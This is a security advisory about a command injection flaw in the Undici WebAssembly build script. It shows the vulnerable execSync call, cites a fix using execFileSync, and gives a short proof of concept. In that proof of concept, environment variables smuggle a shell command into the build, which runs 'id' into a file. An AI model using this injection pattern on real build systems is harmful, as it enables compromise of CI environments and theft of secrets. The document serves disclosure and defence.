## Summary
A command injection vulnerability was discovered in the WebAssembly build script of Node.js Undici. The issue resides in the `build/wasm.js` script, where unsafe string interpolation is used with `execSync`. Attackers can manipulate environment variables such as `WASM_OPT` or `WASM_OPT_FLAGS` to execute arbitrary commands on the build system.
This vulnerability enables full compromise of the build environment, leading to potential supply chain attacks.
Severity is **High (CVSS 3.1: 8.1 AV\:N/AC\:H/PR\:N/UI\:N/S\:U/C\:H/I\:H/A\:H)**.


The vulnerable code is located in `build/wasm.js`:

```javascript
execSync(`${WASM_OPT} ${WASM_OPT_FLAGS} --enable-simd -o ${join(WASM_OUT, 'llhttp_simd.wasm')} ${join(WASM_OUT, 'llhttp_simd.wasm')}`, { 
    stdio: 'inherit' 
})
```

Because `execSync` interpolates untrusted environment variables directly into a shell command string, any attacker with control over the build environment (via CI/CD, npm scripts, or malicious dependency injection) can break out of the intended command structure and inject arbitrary shell commands.

The patch (PR #4392) resolves this by switching to `execFileSync`, which passes arguments as a list rather than invoking a shell interpreter, eliminating the injection vector.


## Proof of Concept (PoC)

1. Clone the repository and switch to a vulnerable commit:

```bash
git clone https://github.com/nodejs/undici.git
cd undici
git checkout c3f559154b061d73e9ce4be7e540ae69c8f26fcb
npm install
```

2. Set malicious environment variables:

```bash
export WASM_OPT="/bin/sh"
export WASM_OPT_FLAGS='-c "echo VULNERABLE > /tmp/undici_exploit; id >> /tmp/undici_exploit"'
```

3. Run the build script:

```bash
npm run build:wasm
```

4. Verify exploitation:

```bash
cat /tmp/undici_exploit
# VULNERABLE
# uid=1000(user) gid=1000(user) groups=1000(user)
```

This demonstrates arbitrary command execution via manipulated environment variables.


## Impact

* **Type of Vulnerability**: Command Injection (CWE-78)
* **Attack Vector**: Malicious environment variables during WASM build
* **Affected Users**:

  * Developers building Undici from source
  * CI/CD environments integrating Undici
  * Downstream projects depending on potentially backdoored WASM artifacts
* **Impact**:

  * Arbitrary command execution
  * Theft of build secrets (npm tokens, AWS credentials, CI/CD keys)
  * Supply chain compromise by injecting malicious code into distributed WASM artifacts
